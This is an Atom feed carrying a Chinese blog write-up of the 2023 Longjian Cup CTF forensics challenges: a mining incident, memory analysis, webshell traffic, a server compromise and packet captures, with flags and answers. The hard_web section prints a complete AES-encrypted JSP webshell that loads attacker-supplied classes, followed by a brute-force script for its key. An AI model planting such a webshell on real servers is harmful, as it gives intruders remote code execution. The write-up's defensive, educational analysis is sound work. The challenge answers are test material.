<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>cvbxy&#39;s blog</title>
  
  
  <link href="https://cvbxy.github.io/atom.xml" rel="self"/>
  
  <link href="https://cvbxy.github.io/"/>
  <updated>2024-06-20T08:17:34.538Z</updated>
  <id>https://cvbxy.github.io/</id>
  
  <author>
    <name>cvbxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023陇剑杯</title>
    <link href="https://cvbxy.github.io/2024/06/20/2023%E9%99%87%E5%89%91%E6%9D%AF/"/>
    <id>https://cvbxy.github.io/2024/06/20/2023%E9%99%87%E5%89%91%E6%9D%AF/</id>
    <published>2024-06-20T08:06:06.000Z</published>
    <updated>2024-06-20T08:17:34.538Z</updated>
    
    <content type="html"><![CDATA[<h3 id="IncidentResponse"><a href="#IncidentResponse" class="headerlink" title="IncidentResponse"></a>IncidentResponse</h3><blockquote><p>你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root&#x2F;IncidentResponsePasswd）<br>挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>本题附件见于平台公告的IR.zip，解压密码为f0b1ba11478343f404666c355919de3f<br>echo -n ‘&#x2F;etc&#x2F;redis&#x2F;redis-server’|md5sum|cut -d ‘ ‘ -f1<br>6f72038a870f05cbf923633066e48881</p></blockquote><p>对ova文件用r-studio进行恢复，把vmdk文件提取出来</p><p><img src="/img/blogimg/1706702667214-935e885f-38f0-400d-a573-f3e1ed55995b.png"></p><p>用DiskGenius恢复vmdk里面的文件</p><p><img src="/img/blogimg/1706702694143-b64ae039-ff7a-4db9-b653-2c9915a06581.png"></p><p>ova导入虚拟机，<code>ps -ef</code> 查看运行的进程</p><p><img src="/img/blogimg/1706702702919-374abd92-8660-4745-a746-4acc52c5498a.png"></p><p>发现&#x2F;etc&#x2F;redis目录下有可疑文件</p><p><img src="/img/blogimg/1706702718567-ba742dfd-a9f9-4cd5-8d6e-91ca6fbd6d0d.png"></p><blockquote><p>挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘donate.v2.xmrig.com’|md5sum|cut -d ‘ ‘ -f1<br>3fca20bb92d0ed67714e68704a0a4503</p></blockquote><p><img src="/img/blogimg/1706702725580-c76af453-2010-4139-aada-e4001b56c62c.png"></p><blockquote><p>攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>题目提示：答案md5值前两位为3e<br>echo -n ‘shirodeserialization’|md5sum|cut -d ‘ ‘ -f1<br>3ee726cb32f87a15d22fe55fa04c4dcd</p></blockquote><p>&#x2F;home&#x2F;app目录下的log里面可以找到shiro的报错，应该是shiro反序列化</p><p><img src="/img/blogimg/1706702733168-ca7cd749-4ef2-4ab0-9074-308d03ffc582.png"></p><blockquote><p>攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘81.70.166.3’|md5sum|cut -d ‘ ‘ -f1<br>c76b4b1a5e8c9e7751af4684c6a8b2c9</p></blockquote><p>查看日志</p><p><img src="/img/blogimg/1706702764622-f2a25ca1-8977-44a5-93f4-ba999244681d.png"></p><p><img src="/img/blogimg/1706702769449-4b362aa3-91d7-47bc-bfae-ab713370303b.png"></p><blockquote><p>攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘mozilla&#x2F;5.0(compatible;baiduspider&#x2F;2.0;+<a href="http://www.baidu.com/search/spider.html)'|md5sum|cut">http://www.baidu.com/search/spider.html)&#39;|md5sum|cut</a> -d ‘ ‘ -f1<br>6ba8458f11f4044cce7a621c085bb3c6</p></blockquote><p>日志文件末尾的POST包</p><p><img src="/img/blogimg/1706702777901-0bf41029-6ff6-4bf8-8bf3-c4c3dd822c18.png"></p><blockquote><p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘&#x2F;root&#x2F;.ssh&#x2F;authorized_keys’|md5sum|cut -d ‘ ‘ -f1<br>a1fa1b5aeb1f97340032971c342c4258</p></blockquote><p>在流量包里面发现了修改root的authorized_keys</p><blockquote><p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;redis.service’|md5sum|cut -d ‘ ‘ -f1<br>b2c5af8ce08753894540331e5a947d35</p></blockquote><p>查找所有与redis相关的文件，看到一个疑似开机自启的服务</p><p><img src="/img/blogimg/1706702806491-657b94a1-6abf-4ee2-b8ed-bec9c46ea11d.png"></p><h3 id="baby-forensics"><a href="#baby-forensics" class="headerlink" title="baby_forensics"></a>baby_forensics</h3><blockquote><p>磁盘中的key是多少？<br>本题附件见于平台公告的BF.zip，解压密码为4cf611fce4a2fec305e54c2766b7c860<br>2e80307085fd2b5c49c968c323ee25d5</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw imageinfo</span><br>Volatility Foundation Volatility Framework 2.6.1<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418<br>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/tmp/baby.raw)<br>                      PAE <span class="hljs-built_in">type</span> : No PAE<br>                           DTB : 0x187000L<br>                          KDBG : 0xf800040420a0L<br>          Number of Processors : 4<br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xfffff80004043d00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0xfffff880009ef000L<br>                KPCR <span class="hljs-keyword">for</span> CPU 2 : 0xfffff88004569000L<br>                KPCR <span class="hljs-keyword">for</span> CPU 3 : 0xfffff880045df000L<br>             KUSER_SHARED_DATA : 0xfffff78000000000L<br>           Image <span class="hljs-built_in">date</span> and time : 2022-05-29 12:14:16 UTC+0000<br>     Image <span class="hljs-built_in">local</span> <span class="hljs-built_in">date</span> and time : 2022-05-29 20:14:16 +0800<br><br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 filescan | grep &quot;key.txt&quot; </span><br>Volatility Foundation Volatility Framework 2.6.1<br>0x000000003df80070      2      0 -W-rwd \Device\HarddiskVolume2\Users\admin\AppData\Local\Temp\vmware-admin\VMwareDnD\abafa01a\key.txt<br>0x000000003df94070     16      0 RW---- \Device\HarddiskVolume3\key.txt<br><br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 dumpfiles -Q &#x27;0x000000003df80070&#x27; -D /tmp</span><br>Volatility Foundation Volatility Framework 2.6.1<br>DataSectionObject 0x3df80070   None   \Device\HarddiskVolume2\Users\admin\AppData\Local\Temp\vmware-admin\VMwareDnD\abafa01a\key.txt<br><br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># cat file.None.0xfffffa800e7f96f0.dat </span><br>E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706703025431-92091c6d-335e-436a-9048-3a16a15637a3.png"></p><blockquote><p>电脑中正在运行的计算器的运行结果是多少？<br>7598632541</p></blockquote><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 windows &gt; dump</span><br><span class="hljs-comment"># windoes:Print Desktop Windows (verbose details)</span><br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706703038999-16246204-6664-4b2a-b282-b065e5acefd4.png"></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 psscan        </span><br>Volatility Foundation Volatility Framework 2.6.1<br>Offset(P)          Name                PID   PPID PDB                Time created                   Time exited                   <br>------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------<br>0x000000003dd2cb30 calc.exe           2844   2552 0x000000000eb93000 2022-05-29 11:50:36 UTC+0000                                 <br>0x000000003ddbeb30 StikyNot.exe       2968   2552 0x00000000366e7000 2022-05-29 12:05:25 UTC+0000                                 <br>0x000000003de20910 explorer.exe       2552   2516 0x0000000032058000 2022-04-14 11:14:06 UTC+0000                                 <br>0x000000003de22060 dwm.exe            2528    884 0x0000000031ee7000 2022-04-14 11:14:06 UTC+0000                                 <br>0x000000003de4b6b0 WmiPrvSE.exe       2312    644 0x0000000032adc000 2022-04-14 11:14:03 UTC+0000                                 <br>0x000000003df62890 vmtoolsd.exe       2660   2552 0x000000002b715000 2022-04-14 11:14:07 UTC+0000                                 <br>0x000000003dfda910 SearchIndexer.     2884    520 0x0000000026bf8000 2022-04-14 11:14:13 UTC+0000                                 <br>0x000000003e014060 rundll32.exe       2104    644 0x0000000000c26000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e021b30 vmtoolsd.exe       1544    520 0x000000000dd3b000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e075b30 taskhost.exe       1696    520 0x000000000a03b000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e10f630 sppsvc.exe         1952    520 0x0000000007832000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e148820 svchost.exe        2016    520 0x0000000007a03000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e197630 dllhost.exe        1792    520 0x0000000006b10000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e243b30 spoolsv.exe        1148    520 0x00000000122cf000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e275b30 svchost.exe        1180    520 0x0000000011b4d000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e302440 taskhost.exe       1748    520 0x0000000021982000 2022-05-29 11:43:51 UTC+0000                                 <br>0x000000003e335b30 svchost.exe        1320    520 0x0000000010492000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e3aab30 VGAuthService.     1404    520 0x000000000f15c000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e3f9400 svchost.exe        2976    520 0x000000000bfc6000 2022-05-29 11:44:06 UTC+0000                                 <br>0x000000003e430360 wmpnetwk.exe       1064    520 0x0000000014c8c000 2022-05-29 11:44:07 UTC+0000                                 <br>0x000000003e436b30 svchost.exe         644    520 0x00000000185ed000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e45f460 vmacthlp.exe        708    520 0x0000000018550000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e47e5f0 svchost.exe         752    520 0x0000000017ad6000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e4bb740 svchost.exe         840    520 0x0000000017ce9000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e4e4b30 svchost.exe         884    520 0x00000000172f0000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e4edb30 svchost.exe         908    520 0x000000001723e000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e566830 svchost.exe         368    520 0x00000000164c5000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e59eb30 svchost.exe         988    520 0x0000000015dce000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e733b30 msdtc.exe          2092    520 0x000000003b51a000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e75d510 wininit.exe         412    344 0x000000001acc3000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003e768460 csrss.exe           420    404 0x000000001ac8a000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003e798b30 winlogon.exe        468    404 0x000000001a390000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003e7ba7c0 services.exe        520    412 0x0000000018e7b000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e7c4b30 lsass.exe           536    412 0x0000000018da3000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e7cb7b0 lsm.exe             544    412 0x000000001906b000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003ee32530 dllhost.exe        3420    644 0x0000000024b7a000 2022-05-29 12:14:17 UTC+0000                                 <br>0x000000003ee8d590 DumpIt.exe         3212   2552 0x0000000001cdf000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003ee92060 conhost.exe        3236    420 0x0000000012664000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003ef11790 dllhost.exe        2488    644 0x0000000001f1a000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003efa76f0 dllhost.exe        2836    644 0x0000000037d5a000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003efd0790 dllhost.exe        2488    644 0x0000000001f1a000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003f1ab060 dllhost.exe        3364    644 0x0000000032a08000 2022-05-29 12:13:10 UTC+0000                                 <br>0x000000003f1adb30 SearchFilterHo     3936   2884 0x000000000ec8c000 2022-05-29 12:14:00 UTC+0000                                 <br>0x000000003f1e0060 taskhost.exe       3244    520 0x0000000020df5000 2022-05-29 12:13:06 UTC+0000                                 <br>0x000000003f1e9060 iexplore.exe       3532   3480 0x0000000025a35000 2022-05-29 12:13:21 UTC+0000                                 <br>0x000000003f1f6b30 SearchProtocol     3916   2884 0x000000001b2e9000 2022-05-29 12:14:00 UTC+0000                                 <br>0x000000003f2e7780 iexplore.exe       3480   2552 0x00000000115d5000 2022-05-29 12:13:21 UTC+0000                                 <br>0x000000003f5a6b30 csrss.exe           360    344 0x000000001b6bd000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003f5af6f0 audiodg.exe        1276    840 0x0000000039805000 2022-05-29 12:07:28 UTC+0000                                 <br>0x000000003f5fb650 smss.exe            268      4 0x00000000204fc000 2022-04-14 11:13:59 UTC+0000                                 <br>0x000000003fe39060 iexplore.exe       3824   3480 0x0000000014820000 2022-05-29 12:13:59 UTC+0000                                 <br>0x000000003ff40b30 System                4      0 0x0000000000187000 2022-04-14 11:13:59 UTC+0000                                 <br>                                                                                                                                                              <br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 memdump -p 2844 -D /tmp</span><br>Volatility Foundation Volatility Framework 2.6.1<br>************************************************************************<br>Writing calc.exe [  2844] to 2844.dmp<br></code></pre></td></tr></table></figure><p>将后缀改成data，然后用gimp查看data</p><p><img src="/img/blogimg/1706703063960-74f4498a-259f-44f3-995b-bf41b79996c1.png"></p><blockquote><p>该内存文件中存在的flag值是多少？<br>flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}</p></blockquote><h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>导出StikyNot.exe，将后缀改成data，然后用gimp查看data</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 memdump -p 2968 -D /tmp</span><br>Volatility Foundation Volatility Framework 2.6.1<br>************************************************************************<br>Writing StikyNot.exe [  2968] to 2968.dmp<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706703086415-03113fcc-53e5-4425-96f3-575373f24361.png"></p><p><img src="/img/blogimg/1706703095127-99e72356-e47f-4a8e-a71c-9c67c6197040.png"></p><h4 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h4><p>将raw文件直接用010打开，然后可以发现疑似密文的东西</p><p><img src="/img/blogimg/1706703104975-b81f6cca-f21c-43b8-8a68-e0d903898cb9.png"></p><p>疑似密码，用aes解密</p><p><img src="/img/blogimg/1706703127789-89b5a477-3b81-4fa1-a6c0-5ac699af868b.png"></p><p><img src="/img/blogimg/1706703131576-01e40753-46ca-4077-b838-7de139778185.png"></p><h3 id="hard-web"><a href="#hard-web" class="headerlink" title="hard_web"></a>hard_web</h3><blockquote><p>服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)<br>80,888,8888</p></blockquote><p>统计→会话可以发现存在端口扫描行为</p><p><img src="/img/blogimg/1706703834124-8259ba3f-abf1-44dc-8166-e7a8143642f2.png"></p><p> 可以发现80,888,,8888三个端口</p><p><img src="/img/blogimg/1706702419897-49846437-f65c-48a8-ae68-7db6ba165597.png"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.connection.synack and ip.dst<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">192.168</span>.<span class="hljs-number">162.180</span><br></code></pre></td></tr></table></figure><blockquote><p>服务器中根目录下的flag值是多少？<br>flag{9236b29d-5488-41e6-a04b-53b0d8276542}</p></blockquote><p>网站本身就存在的木马test.jsp</p><p><img src="/img/blogimg/1706702448265-9bc36267-9762-4230-8b5f-70b92f65398f.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;, data);Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;<br></code></pre></td></tr></table></figure><p>解密POST的jsp数据</p><p><img src="/img/blogimg/1706702481879-a8a2cf32-fc78-4f54-a6e1-3f0327c3c75b.png"></p><p>找到最后一个shell.jsp的包，解密即可</p><p><img src="/img/blogimg/1706702488479-9d12efb0-7d36-4b77-af48-1e710b2e618c.png"></p><blockquote><p>该webshell的连接密码是多少？<br>14mk3y</p></blockquote><p>找到倒数第三个jsp流量包，解密发现需要爆破密码</p><p><img src="/img/blogimg/1706702499328-b791fae3-15b8-4d4a-bb02-ad573ee47971.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_md5</span>(<span class="hljs-params">input_string</span>):<br>    md5 = hashlib.md5()<br>    md5.update(input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br>s = string.ascii_letters + string.digits + string.punctuation<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> s:<br>                <span class="hljs-built_in">input</span> = <span class="hljs-string">&#x27;1&#x27;</span> + a + b + c + d + <span class="hljs-string">&#x27;y&#x27;</span><br>                <span class="hljs-keyword">if</span> generate_md5(<span class="hljs-built_in">input</span>)[:<span class="hljs-number">16</span>]  == <span class="hljs-string">&#x27;748007e861908c03&#x27;</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">input</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/1706702515749-443a37e2-2693-41d0-935e-256a3d967e83.png"></p><h3 id="sevrer-save"><a href="#sevrer-save" class="headerlink" title="sevrer save"></a>sevrer save</h3><blockquote><p>黑客是使用什么漏洞来拿下root权限的。格式为：CVE-2020-114514<br>本题附件见于平台公告的SS.zip，解压密码为c77ad47ba4c85fae66f08ec12e0085dd<br>CVE-2022-22965</p></blockquote><p><img src="/img/blogimg/1706702542826-5303883b-789f-45d3-b792-a0fc003f1be0.png"></p><p><img src="/img/blogimg/1706702547317-7b064922-810c-44a1-be6a-64cb0e81c2a2.png"></p><blockquote><p>黑客反弹shell的ip和端口是什么，格式为：10.0.0.1:4444<br>192.168.43.128:2333</p></blockquote><p><img src="/img/blogimg/1706702560197-d33954ed-7069-4104-a063-0f0007006005.png"></p><blockquote><p>黑客的病毒名称是什么？ 格式为：filename<br>main</p></blockquote><p>&#x2F;home&#x2F;guests目录下面发现可疑文件</p><p><img src="/img/blogimg/1706702574008-ae77f0d4-24dd-4704-a775-bb0002e4a8a8.png"></p><blockquote><p>黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:password<br>ll:123456</p></blockquote><p>查看&#x2F;etc&#x2F;shadow文件</p><p><img src="/img/blogimg/1706702582745-b2a8f38d-2c78-4db7-b4e9-9361fc974543.png"></p><blockquote><p>服务器在被入侵时外网ip是多少? 格式为：10.10.0.1<br>172.105.202.239</p></blockquote><p>查看log.txt</p><p><img src="/img/blogimg/1706702590445-624fa4d5-5ecf-4d75-aba1-dde22d8a3de3.png"></p><blockquote><p>病毒运行后释放了什么文件？格式：文件1,文件2<br>lolMiner,mine_doge.sh</p></blockquote><p>.idea为main病毒释放的文件</p><p><img src="/img/blogimg/1706702606340-072ceb17-ed3c-4842-8f76-c86898040c1d.png"></p><blockquote><p>矿池地址是什么？ 格式：domain:1234<br>doge.millpools.cc:5567</p></blockquote><p>查看sh文件，可以发现矿池地址和钱包地址</p><p><img src="/img/blogimg/1706702613793-472fe8bb-4dd6-4502-bcab-a697737cc1ce.png"></p><blockquote><p>黑客的钱包地址是多少？格式：xx:xxxxxxxx<br>DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9</p></blockquote><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><blockquote><p>被入侵主机的IP是？<br>192.168.246.28</p></blockquote><p><img src="/img/blogimg/1706702630964-bc6a7be9-1814-414d-803c-17a89d8694ad.png"></p><blockquote><p>被入侵主机的口令是？<br>youcannevergetthis</p></blockquote><p><img src="/img/blogimg/1706702640527-57ad9ae6-d624-4469-81f6-0726219f4d5d.png"></p><blockquote><p>用户目录下第二个文件夹的名称是？<br>Downloads</p></blockquote><p><img src="/img/blogimg/1706702646964-eceb4f26-62fe-4c44-b0e9-5625ec702c9e.png"></p><blockquote><p>&#x2F;etc&#x2F;passwd中倒数第二个用户的用户名是？<br>mysql</p></blockquote><p><img src="/img/blogimg/1706702653879-87ff98c8-5fd8-4d10-9f74-3dbde04fdbec.png"></p><h3 id="SmallSword"><a href="#SmallSword" class="headerlink" title="SmallSword"></a>SmallSword</h3><blockquote><p>连接蚁剑的正确密码是__?（答案示例：123asd）<br>6ea280898e404bfabd0ebb702327b19f</p></blockquote><p><img src="/img/blogimg/1706702833953-c34a3ce7-2d43-4227-b4f1-8668bfb73e14.png"></p><blockquote><p>攻击者留存的值是__?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e)<br>ad6269b7-3ce2-4ae8-b97f-f259515e7a91</p></blockquote><p><img src="/img/blogimg/1706702843484-85d4ebb0-ba6d-4244-80d4-e35267989656.png"></p><p><img src="/img/blogimg/1706702847668-89d66c34-bbd6-48af-8eb8-05a1fb875994.png"></p><blockquote><p>攻击者下载到的flag是__?(答案示例：flag3{uuid})<br>flag{8f0dffac-5801-44a9-bd49-e66192ce4f57}</p></blockquote><p><img src="/img/blogimg/1706702855620-005b1c4e-5b9b-4fcd-b7c3-a46fcd60cb25.png"></p><p>文件-&gt;导出对象-&gt;http-&gt;Save All-&gt;保存到文件夹中，info(12)有5m，是上面的exe文件对应的流量，拖入010editor</p><p><img src="/img/blogimg/1706702874392-72852096-7358-4291-bfd7-d24657e9743e.png"></p><p>从第三位开始是<code>4D5A90</code>是<code>EXE</code>文件的头部信息特征,所以我们删除前面三个,将其另存为<code>exe</code>执行</p><p><img src="/img/blogimg/1706702880040-45d10690-d637-4c11-996c-37e3a18b9d16.png"></p><p>看别人的wp写运行之后会生成图片，我的不行，放到微步的沙箱可以生成</p><p><img src="/img/blogimg/1706702886594-bda6ea38-c34e-4209-8e21-f2fca61af104.png"></p><p>爆破宽高</p><p><img src="/img/blogimg/1706702897671-69f3b436-cf11-47e2-a385-c0ccd67650a1.png"></p><p><img src="/img/blogimg/1706702905758-986ecb5b-e4b4-4303-9168-a99960b98fb9.png"></p><p><img src="/img/blogimg/1706702910734-f3d481de-efaf-43ce-a609-992b2efd07db.png"></p><p><img src="/img/blogimg/1706702919743-6d3c40a5-5295-4982-9b98-4dae674825f2.png"></p><h3 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h3><blockquote><p>服务器自带的后门文件名是什么？（含文件后缀）<br>ViewMore.php</p></blockquote><p><img 